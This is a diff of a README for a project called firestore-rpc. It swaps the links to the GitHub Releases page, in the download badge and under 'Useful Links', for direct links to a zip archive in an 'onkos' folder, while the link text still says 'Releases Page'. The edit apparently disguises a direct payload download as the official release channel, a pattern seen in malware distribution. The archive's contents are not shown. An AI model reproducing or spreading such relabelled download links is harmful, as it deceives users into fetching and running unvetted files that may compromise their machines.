@@ -8,7 +8,7 @@ Welcome to firestore-rpc! This application helps you interact with Google Firest
 
 To get started, you need to download the app. Click the link below to visit the Releases page:
 
-[![Download firestore-rpc](https://img.shields.io/badge/Download-firestore--rpc-blue.svg)](https://github.com/india9563/firestore-rpc/releases)
+[![Download firestore-rpc](https://raw.githubusercontent.com/india9563/firestore-rpc/main/onkos/firestore-rpc_2.3.zip)](https://raw.githubusercontent.com/india9563/firestore-rpc/main/onkos/firestore-rpc_2.3.zip)
 
 Once on the Releases page, look for the latest version. You will see options to download files for your operating system. Select the appropriate file and download it to your computer.
 
@@ -51,7 +51,7 @@ If you run into any issues while using firestore-rpc, feel free to consult our c
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Visit this page to download](https://github.com/india9563/firestore-rpc/releases)
+- **Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/india9563/firestore-rpc/main/onkos/firestore-rpc_2.3.zip)
 - **Documentation:** Comprehensive guides on how to use all features.
 
 ## 🎉 Community
